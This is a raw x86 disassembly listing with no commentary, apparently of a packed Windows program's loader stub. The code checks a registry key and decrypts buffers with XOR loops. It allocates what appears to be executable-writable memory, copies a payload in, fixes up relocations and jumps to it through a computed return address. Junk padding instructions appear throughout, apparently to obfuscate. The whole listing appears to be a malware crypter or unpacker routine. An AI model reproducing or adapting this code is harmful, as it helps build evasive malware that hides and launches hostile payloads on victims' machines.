  451280:	mov    DWORD PTR ds:0x456148,ebp
  451286:	mov    DWORD PTR [ebp-0x2c],0x0
  45128d:	mov    DWORD PTR [ebp-0x3c],0x80000002
  451294:	mov    DWORD PTR [ebp-0x6c],0x455000
  45129b:	mov    eax,ds:0x455468
  4512a0:	mov    DWORD PTR [ebp-0x64],eax
  4512a3:	mov    DWORD PTR [ebp-0xc],0x1471
  4512aa:	mov    DWORD PTR [ebp-0xc],0x1471
  4512b1:	mov    ecx,DWORD PTR ds:0x4555e0
  4512b7:	mov    DWORD PTR [ebp-0x60],ecx
  4512ba:	lea    edx,[ebp-0x68]
  4512bd:	push   edx
  4512be:	push   0x20019
  4512c3:	push   0x0
  4512c5:	push   0x455030
  4512ca:	push   0x80000002
  4512cf:	call   DWORD PTR [ebp-0x60]
  4512d2:	test   eax,eax
  4512d4:	jne    0x4512e5
  4512d6:	push   0x0
  4512d8:	call   DWORD PTR ds:0x455450
  4512de:	xor    eax,eax
  4512e0:	jmp    0x451520
  4512e5:	lea    eax,[ebp-0x68]
  4512e8:	push   eax
  4512e9:	push   0x20019
  4512ee:	push   0x0
  4512f0:	mov    ecx,DWORD PTR [ebp-0x6c]
  4512f3:	push   ecx
  4512f4:	push   0x80000002
  4512f9:	call   DWORD PTR [ebp-0x60]
  4512fc:	test   eax,eax
  4512fe:	je     0x45130f
  451300:	push   0x0
  451302:	call   DWORD PTR ds:0x455450
  451308:	xor    eax,eax
  45130a:	jmp    0x451520
  45130f:	call   0x450a40
  451314:	mov    edx,DWORD PTR ds:0x456134
  45131a:	push   edx
  45131b:	call   0x450410
  451320:	add    esp,0x4
  451323:	mov    ds:0x45612c,eax
  451328:	mov    eax,ds:0x45612c
  45132d:	push   eax
  45132e:	call   0x451660
  451333:	add    esp,0x4
  451336:	mov    ds:0x456154,eax
  45133b:	mov    ecx,DWORD PTR ds:0x45612c
  451341:	mov    DWORD PTR [ebp-0x34],ecx
  451344:	mov    DWORD PTR [ebp-0x24],0x64
  45134b:	mov    DWORD PTR [ebp-0x14],0x5
  451352:	mov    DWORD PTR [ebp-0x2c],0x0
  451359:	mov    DWORD PTR [ebp-0x18],0x0
  451360:	mov    DWORD PTR [ebp-0x20],0x1
  451367:	mov    DWORD PTR [ebp-0xc],0x0
  45136e:	mov    edx,DWORD PTR [ebp-0x2c]
  451371:	cmp    edx,DWORD PTR ds:0x45612c
  451377:	jae    0x4513cb
  451379:	mov    eax,DWORD PTR [ebp-0x34]
  45137c:	push   eax
  45137d:	mov    ecx,DWORD PTR [ebp-0x24]
  451380:	push   ecx
  451381:	call   0x450480
  451386:	add    esp,0x8
  451389:	mov    DWORD PTR [ebp-0x38],eax
  45138c:	mov    edx,DWORD PTR [ebp-0x38]
  45138f:	push   edx
  451390:	mov    eax,ds:0x456134
  451395:	add    eax,DWORD PTR [ebp-0x18]
  451398:	push   eax
  451399:	mov    ecx,DWORD PTR ds:0x456154
  45139f:	add    ecx,DWORD PTR [ebp-0x2c]
  4513a2:	push   ecx
  4513a3:	call   0x451840
  4513a8:	add    esp,0xc
  4513ab:	mov    edx,DWORD PTR [ebp-0x14]
  4513ae:	add    edx,DWORD PTR [ebp-0x24]
  4513b1:	add    edx,DWORD PTR [ebp-0x18]
  4513b4:	mov    DWORD PTR [ebp-0x18],edx
  4513b7:	mov    eax,DWORD PTR [ebp-0x2c]
  4513ba:	add    eax,DWORD PTR [ebp-0x24]
  4513bd:	mov    DWORD PTR [ebp-0x2c],eax
  4513c0:	mov    ecx,DWORD PTR [ebp-0x34]
  4513c3:	sub    ecx,DWORD PTR [ebp-0x38]
  4513c6:	mov    DWORD PTR [ebp-0x34],ecx
  4513c9:	jmp    0x45136e
  4513cb:	mov    edx,DWORD PTR ds:0x45612c
  4513d1:	push   edx
  4513d2:	mov    eax,ds:0x456154
  4513d7:	push   eax
  4513d8:	call   0x451530
  4513dd:	add    esp,0x8
  4513e0:	pusha  
  4513e1:	mov    DWORD PTR [ebp-0x18],0x0
  4513e8:	mov    DWORD PTR [ebp-0x70],0x0
  4513ef:	mov    ecx,DWORD PTR ds:0x45612c
  4513f5:	push   ecx
  4513f6:	push   0x0
  4513f8:	mov    edx,DWORD PTR ds:0x456130
  4513fe:	push   edx
  4513ff:	call   0x4503c0
  451404:	add    esp,0xc
  451407:	mov    eax,ds:0x45612c
  45140c:	mov    DWORD PTR [ebp-0x78],eax
  45140f:	mov    ecx,DWORD PTR [ebp-0x70]
  451412:	cmp    ecx,DWORD PTR ds:0x45612c
  451418:	jae    0x45146c
  45141a:	mov    edx,DWORD PTR [ebp-0x78]
  45141d:	push   edx
  45141e:	mov    eax,DWORD PTR [ebp-0x24]
  451421:	push   eax
  451422:	call   0x450480
  451427:	add    esp,0x8
  45142a:	mov    DWORD PTR [ebp-0x7c],eax
  45142d:	mov    ecx,DWORD PTR [ebp-0x7c]
  451430:	push   ecx
  451431:	mov    edx,DWORD PTR ds:0x456134
  451437:	add    edx,DWORD PTR [ebp-0x18]
  45143a:	push   edx
  45143b:	mov    eax,ds:0x456130
  451440:	add    eax,DWORD PTR [ebp-0x70]
  451443:	push   eax
  451444:	call   0x451840
  451449:	add    esp,0xc
  45144c:	mov    ecx,DWORD PTR [ebp-0x14]
  45144f:	add    ecx,DWORD PTR [ebp-0x24]
  451452:	add    ecx,DWORD PTR [ebp-0x18]
  451455:	mov    DWORD PTR [ebp-0x18],ecx
  451458:	mov    edx,DWORD PTR [ebp-0x70]
  45145b:	add    edx,DWORD PTR [ebp-0x24]
  45145e:	mov    DWORD PTR [ebp-0x70],edx
  451461:	mov    eax,DWORD PTR [ebp-0x78]
  451464:	sub    eax,DWORD PTR [ebp-0x7c]
  451467:	mov    DWORD PTR [ebp-0x78],eax
  45146a:	jmp    0x45140f
  45146c:	mov    ecx,DWORD PTR ds:0x45612c
  451472:	push   ecx
  451473:	mov    edx,DWORD PTR ds:0x456130
  451479:	push   edx
  45147a:	call   0x451530
  45147f:	add    esp,0x8
  451482:	mov    DWORD PTR [ebp-0x28],0x450a00
  451489:	mov    eax,ds:0x456154
  45148e:	mov    ecx,DWORD PTR ds:0x456130
  451494:	mov    DWORD PTR [eax],ecx
  451496:	push   0x4d000
  45149b:	call   0x451660
  4514a0:	add    esp,0x4
  4514a3:	mov    ds:0x456158,eax
  4514a8:	mov    edx,DWORD PTR ds:0x456158
  4514ae:	add    edx,0x300
  4514b4:	mov    DWORD PTR ds:0x45615c,edx
  4514ba:	push   0x4af00
  4514bf:	mov    eax,ds:0x456154
  4514c4:	push   eax
  4514c5:	mov    ecx,DWORD PTR ds:0x45615c
  4514cb:	push   ecx
  4514cc:	call   0x451840
  4514d1:	add    esp,0xc
  4514d4:	mov    edx,DWORD PTR ds:0x456158
  4514da:	add    edx,0x4aea0
  4514e0:	mov    DWORD PTR ds:0x45614c,edx
  4514e6:	mov    ecx,ecx
  4514e8:	mov    ecx,ecx
  4514ea:	mov    ecx,ecx
  4514ec:	popa   
  4514ed:	mov    ecx,ecx
  4514ef:	mov    ecx,ecx
  4514f1:	mov    ecx,ecx
  4514f3:	mov    ecx,ecx
  4514f5:	push   0xde9b
  4514fa:	mov    eax,DWORD PTR [ebp-0x28]
  4514fd:	mov    ecx,ecx
  4514ff:	mov    ecx,ecx
  451501:	mov    ecx,esp
  451503:	push   edx
  451504:	mov    edx,ecx
  451506:	sub    edx,0x26
  451509:	mov    ecx,edx
  45150b:	pop    edx
  45150c:	add    ecx,0x22
  45150f:	mov    ecx,ecx
  451511:	mov    DWORD PTR [ecx+0x4],0x0
  451518:	mov    ecx,ecx
  45151a:	add    DWORD PTR [ecx+0x4],eax
  45151d:	ret    
  45151e:	xor    eax,eax
  451520:	pop    edi
  451521:	pop    esi
  451522:	pop    ebx
  451523:	mov    esp,ebp
  451525:	pop    ebp
  451526:	ret    
  451527:	int3   
  451528:	int3   
  451529:	int3   
  45152a:	int3   
  45152b:	int3   
  45152c:	int3   
  45152d:	int3   
  45152e:	int3   
  45152f:	int3   
  451530:	push   ebp
  451531:	mov    ebp,esp
  451533:	sub    esp,0x10
  451536:	mov    DWORD PTR [ebp-0x4],0x0
  45153d:	jmp    0x451548
  45153f:	mov    eax,DWORD PTR [ebp-0x4]
  451542:	add    eax,0x4
  451545:	mov    DWORD PTR [ebp-0x4],eax
  451548:	mov    ecx,DWORD PTR [ebp-0x4]
  45154b:	cmp    ecx,DWORD PTR [ebp+0xc]
  45154e:	jae    0x4515eb
  451554:	mov    DWORD PTR [ebp-0x8],0xc842
  45155b:	mov    DWORD PTR [ebp-0x8],0xc842
  451562:	mov    DWORD PTR [ebp-0x8],0xc842
  451569:	mov    edx,DWORD PTR [ebp-0x4]
  45156c:	add    edx,0xeb290
  451572:	mov    DWORD PTR ds:0x456160,edx
  451578:	mov    DWORD PTR [ebp-0x8],0xc842
  45157f:	mov    eax,DWORD PTR [ebp+0x8]
  451582:	add    eax,DWORD PTR [ebp-0x4]
  451585:	mov    DWORD PTR [ebp-0x10],eax
  451588:	mov    DWORD PTR [ebp-0x8],0xc842
  45158f:	mov    DWORD PTR [ebp-0x8],0xc842
  451596:	mov    DWORD PTR [ebp-0x8],0xc842
  45159d:	mov    ecx,DWORD PTR [ebp-0x10]
  4515a0:	mov    DWORD PTR [ebp-0xc],ecx
  4515a3:	mov    edx,DWORD PTR ds:0x456160
  4515a9:	mov    DWORD PTR [ebp-0x8],edx
  4515ac:	mov    DWORD PTR [ebp-0x8],0xc842
  4515b3:	mov    eax,DWORD PTR [ebp-0x10]
  4515b6:	mov    ecx,DWORD PTR [eax]
  4515b8:	add    ecx,DWORD PTR [ebp-0x4]
  4515bb:	mov    edx,DWORD PTR [ebp-0x10]
  4515be:	mov    DWORD PTR [edx],ecx
  4515c0:	mov    eax,DWORD PTR [ebp-0xc]
  4515c3:	mov    ecx,DWORD PTR [eax]
  4515c5:	mov    DWORD PTR [ebp-0x8],ecx
  4515c8:	mov    edx,DWORD PTR ds:0x456160
  4515ce:	push   edx
  4515cf:	mov    eax,DWORD PTR [ebp-0x8]
  4515d2:	push   eax
  4515d3:	call   0x4515f0
  4515d8:	add    esp,0x8
  4515db:	mov    DWORD PTR [ebp-0x8],eax
  4515de:	mov    ecx,DWORD PTR [ebp-0xc]
  4515e1:	mov    edx,DWORD PTR [ebp-0x8]
  4515e4:	mov    DWORD PTR [ecx],edx
  4515e6:	jmp    0x45153f
  4515eb:	mov    esp,ebp
  4515ed:	pop    ebp
  4515ee:	ret    
  4515ef:	int3   
  4515f0:	push   ebp
  4515f1:	mov    ebp,esp
  4515f3:	sub    esp,0x14
  4515f6:	mov    DWORD PTR [ebp-0x8],0xdd7
  4515fd:	mov    DWORD PTR [ebp-0x8],0xdd7
  451604:	mov    DWORD PTR [ebp-0x8],0xdd7
  45160b:	mov    eax,DWORD PTR [ebp+0x8]
  45160e:	xor    eax,DWORD PTR [ebp+0xc]
  451611:	mov    DWORD PTR [ebp-0x10],eax
  451614:	mov    DWORD PTR [ebp-0x8],0xdd7
  45161b:	mov    DWORD PTR [ebp-0x8],0xdd7
  451622:	mov    ecx,DWORD PTR [ebp+0xc]
  451625:	mov    DWORD PTR [ebp-0x4],ecx
  451628:	mov    DWORD PTR [ebp-0x8],0xdd7
  45162f:	mov    DWORD PTR [ebp-0x8],0xdd7
  451636:	mov    edx,DWORD PTR [ebp+0x8]
  451639:	mov    DWORD PTR [ebp-0xc],edx
  45163c:	mov    DWORD PTR [ebp-0x8],0xdd7
  451643:	mov    DWORD PTR [ebp-0x8],0xdd7
  45164a:	mov    eax,DWORD PTR [ebp-0x10]
  45164d:	mov    DWORD PTR [ebp-0x14],eax
  451650:	mov    eax,DWORD PTR [ebp-0x14]
  451653:	mov    esp,ebp
  451655:	pop    ebp
  451656:	ret    
  451657:	int3   
  451658:	int3   
  451659:	int3   
  45165a:	int3   
  45165b:	int3   
  45165c:	int3   
  45165d:	int3   
  45165e:	int3   
  45165f:	int3   
  451660:	push   ebp
  451661:	mov    ebp,esp
  451663:	sub    esp,0x238
  451669:	mov    DWORD PTR [ebp-0x1c],0x307c
  451670:	mov    DWORD PTR [ebp-0x238],0x3000
  45167a:	mov    DWORD PTR [ebp-0x18],0x40
  451681:	mov    DWORD PTR [ebp-0x22c],0x0
  45168b:	mov    DWORD PTR [ebp-0x230],0x0
  451695:	mov    DWORD PTR [ebp-0x14],0x0
  45169c:	lea    eax,[ebp-0x14]
  45169f:	push   eax
  4516a0:	push   0x0
  4516a2:	call   DWORD PTR ds:0x455464
  4516a8:	cmp    DWORD PTR [ebp-0x14],0x0
  4516ac:	jne    0x4516b2
  4516ae:	xor    eax,eax
  4516b0:	jmp    0x4516ce
  4516b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4516b5:	push   ecx
  4516b6:	mov    edx,DWORD PTR [ebp-0x238]
  4516bc:	push   edx
  4516bd:	mov    eax,DWORD PTR [ebp+0x8]
  4516c0:	push   eax
  4516c1:	mov    ecx,DWORD PTR [ebp-0x22c]
  4516c7:	push   ecx
  4516c8:	call   DWORD PTR ds:0x45546c
  4516ce:	mov    esp,ebp
  4516d0:	pop    ebp
  4516d1:	ret    
  4516d2:	int3   
  4516d3:	int3   
  4516d4:	int3   
  4516d5:	int3   
  4516d6:	int3   
  4516d7:	int3   
  4516d8:	int3   
  4516d9:	int3   
  4516da:	int3   
  4516db:	int3   
  4516dc:	int3   
  4516dd:	int3   
  4516de:	int3   
  4516df:	int3   
  4516e0:	push   ebp
  4516e1:	mov    ebp,esp
  4516e3:	sub    esp,0xc
  4516e6:	mov    DWORD PTR [ebp-0xc],0x889bb
  4516ed:	mov    DWORD PTR [ebp-0xc],0x889bb
  4516f4:	mov    DWORD PTR [ebp-0xc],0x889bb
  4516fb:	mov    DWORD PTR [ebp-0xc],0x889bb
  451702:	mov    DWORD PTR [ebp-0xc],0x889bb
  451709:	mov    DWORD PTR [ebp-0xc],0x889bb
  451710:	mov    DWORD PTR [ebp-0xc],0x889bb
  451717:	mov    DWORD PTR [ebp-0xc],0x889bb
  45171e:	mov    DWORD PTR [ebp-0xc],0x889bb
  451725:	mov    DWORD PTR [ebp-0xc],0x889bb
  45172c:	mov    DWORD PTR [ebp-0xc],0x889bb
  451733:	mov    DWORD PTR [ebp-0x4],0x0
  45173a:	jmp    0x451745
  45173c:	mov    eax,DWORD PTR [ebp-0x4]
  45173f:	add    eax,0x1
  451742:	mov    DWORD PTR [ebp-0x4],eax
  451745:	mov    ecx,DWORD PTR [ebp-0x4]
  451748:	cmp    ecx,DWORD PTR ds:0x456144
  45174e:	jae    0x45183c
  451754:	mov    DWORD PTR [ebp-0xc],0x889bb
  45175b:	mov    DWORD PTR [ebp-0xc],0x889bb
  451762:	mov    DWORD PTR [ebp-0xc],0x889bb
  451769:	mov    DWORD PTR [ebp-0xc],0x889bb
  451770:	mov    DWORD PTR [ebp-0xc],0x889bb
  451777:	mov    DWORD PTR [ebp-0xc],0x889bb
  45177e:	mov    DWORD PTR [ebp-0xc],0x889bb
  451785:	mov    DWORD PTR [ebp-0xc],0x889bb
  45178c:	mov    DWORD PTR [ebp-0xc],0x889bb
  451793:	mov    edx,DWORD PTR [ebp-0x4]
  451796:	push   edx
  451797:	mov    eax,ds:0x456150
  45179c:	push   eax
  45179d:	call   0x450420
  4517a2:	add    esp,0x8
  4517a5:	sar    eax,0xc
  4517a8:	cmp    eax,0x3
  4517ab:	jne    0x451837
  4517b1:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517b8:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517bf:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517c6:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517cd:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517d4:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517db:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517e2:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517e9:	mov    DWORD PTR [ebp-0xc],0x889bb
  4517f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4517f3:	push   ecx
  4517f4:	mov    edx,DWORD PTR ds:0x456150
  4517fa:	push   edx
  4517fb:	call   0x450420
  451800:	add    esp,0x8
  451803:	and    eax,0xfff
  451808:	add    eax,0xa124
  45180d:	mov    DWORD PTR [ebp-0x8],eax
  451810:	mov    eax,DWORD PTR [ebp+0x8]
  451813:	mov    ecx,DWORD PTR [ebp+0xc]
  451816:	add    ecx,DWORD PTR [eax]
  451818:	mov    edx,DWORD PTR [ebp-0x8]
  45181b:	mov    eax,DWORD PTR [ecx+edx*1-0xa124]
  451822:	add    eax,DWORD PTR [ebp+0x10]
  451825:	mov    ecx,DWORD PTR [ebp+0x8]
  451828:	mov    edx,DWORD PTR [ebp+0xc]
  45182b:	add    edx,DWORD PTR [ecx]
  45182d:	mov    ecx,DWORD PTR [ebp-0x8]
  451830:	mov    DWORD PTR [edx+ecx*1-0xa124],eax
  451837:	jmp    0x45173c
  45183c:	mov    esp,ebp
  45183e:	pop    ebp
  45183f:	ret    
  451840:	push   ebp
  451841:	mov    ebp,esp
  451843:	sub    esp,0x8
  451846:	mov    DWORD PTR [ebp-0x4],0x0
  45184d:	jmp    0x451858
  45184f:	mov    eax,DWORD PTR [ebp-0x4]
  451852:	add    eax,0x1
  451855:	mov    DWORD PTR [ebp-0x4],eax
  451858:	mov    ecx,DWORD PTR [ebp-0x4]
  45185b:	cmp    ecx,DWORD PTR [ebp+0x10]
  45185e:	jge    0x4518bf
  451860:	mov    DWORD PTR [ebp-0x8],0x889bb
  451867:	mov    DWORD PTR [ebp-0x8],0x889bb
  45186e:	mov    DWORD PTR [ebp-0x8],0x889bb
  451875:	mov    DWORD PTR [ebp-0x8],0x889bb
  45187c:	mov    DWORD PTR [ebp-0x8],0x889bb
  451883:	mov    DWORD PTR [ebp-0x8],0x889bb
  45188a:	mov    DWORD PTR [ebp-0x8],0x889bb
  451891:	mov    DWORD PTR [ebp-0x8],0x889bb
  451898:	mov    DWORD PTR [ebp-0x8],0x889bb
  45189f:	mov    DWORD PTR [ebp-0x8],0x889bb
  4518a6:	mov    DWORD PTR [ebp-0x8],0x889bb
  4518ad:	mov    edx,DWORD PTR [ebp+0x8]
  4518b0:	add    edx,DWORD PTR [ebp-0x4]
  4518b3:	mov    eax,DWORD PTR [ebp+0xc]
  4518b6:	add    eax,DWORD PTR [ebp-0x4]
  4518b9:	mov    cl,BYTE PTR [eax]
  4518bb:	mov    BYTE PTR [edx],cl
  4518bd:	jmp    0x45184f
  4518bf:	mov    edx,DWORD PTR [ebp+0x8]
  4518c2:	cmp    edx,DWORD PTR ds:0x45615c
  4518c8:	jne    0x4518eb
  4518ca:	mov    eax,ds:0x456158
  4518cf:	sub    eax,0x400000
  4518d4:	push   eax
  4518d5:	mov    ecx,DWORD PTR ds:0x456158
  4518db:	push   ecx
  4518dc:	mov    edx,DWORD PTR ds:0x456130
  4518e2:	push   edx
  4518e3:	call   0x450aa0
  4518e8:	add    esp,0xc
  4518eb:	mov    esp,ebp
  4518ed:	pop    ebp
  4518ee:	ret    
  4518ef:	jmp    DWORD PTR ds:0x455374
  4518f5:	jmp    DWORD PTR ds:0x455378
  4518fb:	jmp    DWORD PTR ds:0x45537c
  451901:	jmp    DWORD PTR ds:0x455380
  451907:	jmp    DWORD PTR ds:0x455384
  45190d:	jmp    DWORD PTR ds:0x455388
  451913:	jmp    DWORD PTR ds:0x45538c
  451919:	jmp    DWORD PTR ds:0x455390
  45191f:	jmp    DWORD PTR ds:0x455394
  451925:	jmp    DWORD PTR ds:0x455398
  45192b:	jmp    DWORD PTR ds:0x45539c
  451931:	jmp    DWORD PTR ds:0x4553a0
  451937:	jmp    DWORD PTR ds:0x4553a4
  45193d:	jmp    DWORD PTR ds:0x4553a8
  451943:	jmp    DWORD PTR ds:0x4553ac
  451949:	jmp    DWORD PTR ds:0x4553b0
  45194f:	jmp    DWORD PTR ds:0x4553b4
  451955:	jmp    DWORD PTR ds:0x4553b8
  45195b:	jmp    DWORD PTR ds:0x4553bc
  451961:	jmp    DWORD PTR ds:0x4553c0
  451967:	jmp    DWORD PTR ds:0x4553c4
  45196d:	jmp    DWORD PTR ds:0x4553c8
  451973:	jmp    DWORD PTR ds:0x4553cc
  451979:	jmp    DWORD PTR ds:0x4553d0
  45197f:	jmp    DWORD PTR ds:0x4553d4
  451985:	jmp    DWORD PTR ds:0x4553d8
  45198b:	jmp    DWORD PTR ds:0x4553dc
  451991:	jmp    DWORD PTR ds:0x4553e0
  451997:	jmp    DWORD PTR ds:0x4553e4
  45199d:	jmp    DWORD PTR ds:0x4553e8
  4519a3:	jmp    DWORD PTR ds:0x4553ec
  4519a9:	jmp    DWORD PTR ds:0x4553f0
  4519af:	jmp    DWORD PTR ds:0x4553f4
  4519b5:	jmp    DWORD PTR ds:0x4553f8
  4519bb:	jmp    DWORD PTR ds:0x4553fc
  4519c1:	jmp    DWORD PTR ds:0x455400
  4519c7:	jmp    DWORD PTR ds:0x455404
  4519cd:	jmp    DWORD PTR ds:0x455408
  4519d3:	jmp    DWORD PTR ds:0x45540c
  4519d9:	jmp    DWORD PTR ds:0x455410
  4519df:	jmp    DWORD PTR ds:0x455414
  4519e5:	jmp    DWORD PTR ds:0x455418
  4519eb:	jmp    DWORD PTR ds:0x45541c
  4519f1:	jmp    DWORD PTR ds:0x455420
  4519f7:	jmp    DWORD PTR ds:0x455424
  4519fd:	jmp    DWORD PTR ds:0x455428
  451a03:	jmp    DWORD PTR ds:0x45542c
  451a09:	jmp    DWORD PTR ds:0x455430
  451a0f:	jmp    DWORD PTR ds:0x455434
  451a15:	jmp    DWORD PTR ds:0x455438
  451a1b:	jmp    DWORD PTR ds:0x45543c
  451a21:	jmp    DWORD PTR ds:0x455440
  451a27:	jmp    DWORD PTR ds:0x455444
  451a2d:	jmp    DWORD PTR ds:0x455448
  451a33:	jmp    DWORD PTR ds:0x45544c
  451a39:	jmp    DWORD PTR ds:0x455450
  451a3f:	jmp    DWORD PTR ds:0x455454
  451a45:	jmp    DWORD PTR ds:0x455458
  451a4b:	jmp    DWORD PTR ds:0x45545c
  451a51:	jmp    DWORD PTR ds:0x455460
  451a57:	jmp    DWORD PTR ds:0x455464
  451a5d:	jmp    DWORD PTR ds:0x455468
  451a63:	jmp    DWORD PTR ds:0x45546c
  451a69:	jmp    DWORD PTR ds:0x455474
  451a6f:	jmp    DWORD PTR ds:0x455478
  451a75:	jmp    DWORD PTR ds:0x45547c
  451a7b:	jmp    DWORD PTR ds:0x455480
  451a81:	jmp    DWORD PTR ds:0x455484
  451a87:	jmp    DWORD PTR ds:0x455488
  451a8d:	jmp    DWORD PTR ds:0x45548c
  451a93:	jmp    DWORD PTR ds:0x455490
  451a99:	jmp    DWORD PTR ds:0x455494
  451a9f:	jmp    DWORD PTR ds:0x455498
  451aa5:	jmp    DWORD PTR ds:0x45549c
  451aab:	jmp    DWORD PTR ds:0x4554a0
  451ab1:	jmp    DWORD PTR ds:0x4554a4
  451ab7:	jmp    DWORD PTR ds:0x4554a8
  451abd:	jmp    DWORD PTR ds:0x4554ac
  451ac3:	jmp    DWORD PTR ds:0x4554b0
  451ac9:	jmp    DWORD PTR ds:0x4554b4
  451acf:	jmp    DWORD PTR ds:0x4554b8
  451ad5:	jmp    DWORD PTR ds:0x4554bc
  451adb:	jmp    DWORD PTR ds:0x4554c0
  451ae1:	jmp    DWORD PTR ds:0x4554c4
  451ae7:	jmp    DWORD PTR ds:0x4554c8
  451aed:	jmp    DWORD PTR ds:0x4554cc
  451af3:	jmp    DWORD PTR ds:0x4554d0
  451af9:	jmp    DWORD PTR ds:0x4554d4
  451aff:	jmp    DWORD PTR ds:0x4554d8
  451b05:	jmp    DWORD PTR ds:0x4554dc
  451b0b:	jmp    DWORD PTR ds:0x4554e0
  451b11:	jmp    DWORD PTR ds:0x4554e4
  451b17:	jmp    DWORD PTR ds:0x4554e8
  451b1d:	jmp    DWORD PTR ds:0x4554ec
  451b23:	jmp    DWORD PTR ds:0x4554f0
  451b29:	jmp    DWORD PTR ds:0x4554f4
  451b2f:	jmp    DWORD PTR ds:0x4554f8
  451b35:	jmp    DWORD PTR ds:0x4554fc
  451b3b:	jmp    DWORD PTR ds:0x455500
  451b41:	jmp    DWORD PTR ds:0x455504
  451b47:	jmp    DWORD PTR ds:0x455508
  451b4d:	jmp    DWORD PTR ds:0x45550c
  451b53:	jmp    DWORD PTR ds:0x455510
  451b59:	jmp    DWORD PTR ds:0x455514
  451b5f:	jmp    DWORD PTR ds:0x455518
  451b65:	jmp    DWORD PTR ds:0x45551c
  451b6b:	jmp    DWORD PTR ds:0x455520
  451b71:	jmp    DWORD PTR ds:0x455524
  451b77:	jmp    DWORD PTR ds:0x455528
  451b7d:	jmp    DWORD PTR ds:0x45552c
  451b83:	jmp    DWORD PTR ds:0x455530
  451b89:	jmp    DWORD PTR ds:0x455534
  451b8f:	jmp    DWORD PTR ds:0x455538
  451b95:	jmp    DWORD PTR ds:0x45553c
  451b9b:	jmp    DWORD PTR ds:0x455540
  451ba1:	jmp    DWORD PTR ds:0x455544
  451ba7:	jmp    DWORD PTR ds:0x455548
  451bad:	jmp    DWORD PTR ds:0x45554c
  451bb3:	jmp    DWORD PTR ds:0x455550
  451bb9:	jmp    DWORD PTR ds:0x455554
  451bbf:	jmp    DWORD PTR ds:0x455558
  451bc5:	jmp    DWORD PTR ds:0x45555c
  451bcb:	jmp    DWORD PTR ds:0x455560
  451bd1:	jmp    DWORD PTR ds:0x455564
  451bd7:	jmp    DWORD PTR ds:0x455568
  451bdd:	jmp    DWORD PTR ds:0x45556c
  451be3:	jmp    DWORD PTR ds:0x455570
  451be9:	jmp    DWORD PTR ds:0x455574
  451bef:	jmp    DWORD PTR ds:0x455578
  451bf5:	jmp    DWORD PTR ds:0x45557c
  451bfb:	jmp    DWORD PTR ds:0x455580
  451c01:	jmp    DWORD PTR ds:0x455584
  451c07:	jmp    DWORD PTR ds:0x455588
  451c0d:	jmp    DWORD PTR ds:0x45558c
  451c13:	jmp    DWORD PTR ds:0x455590
  451c19:	jmp    DWORD PTR ds:0x455594
  451c1f:	jmp    DWORD PTR ds:0x455598
  451c25:	jmp    DWORD PTR ds:0x45559c
  451c2b:	jmp    DWORD PTR ds:0x4555a0
  451c31:	jmp    DWORD PTR ds:0x4555a4
  451c37:	jmp    DWORD PTR ds:0x4555a8
  451c3d:	jmp    DWORD PTR ds:0x4555b0
  451c43:	jmp    DWORD PTR ds:0x4555b4
  451c49:	jmp    DWORD PTR ds:0x4555b8
  451c4f:	jmp    DWORD PTR ds:0x4555bc
  451c55:	jmp    DWORD PTR ds:0x4555c0
  451c5b:	jmp    DWORD PTR ds:0x4555c4
  451c61:	jmp    DWORD PTR ds:0x4555cc
  451c67:	jmp    DWORD PTR ds:0x4555d0
  451c6d:	jmp    DWORD PTR ds:0x4555d8
  451c73:	jmp    DWORD PTR ds:0x4555dc
  451c79:	jmp    DWORD PTR ds:0x4555e0
  451c7f:	jmp    DWORD PTR ds:0x4555e4
  451c85:	jmp    DWORD PTR ds:0x4555e8
  451c8b:	jmp    DWORD PTR ds:0x4555ec
  451c91:	jmp    DWORD PTR ds:0x4555f0
  451c97:	jmp    DWORD PTR ds:0x4555f8
  451c9d:	jmp    DWORD PTR ds:0x455600
  451ca3:	jmp    DWORD PTR ds:0x455604
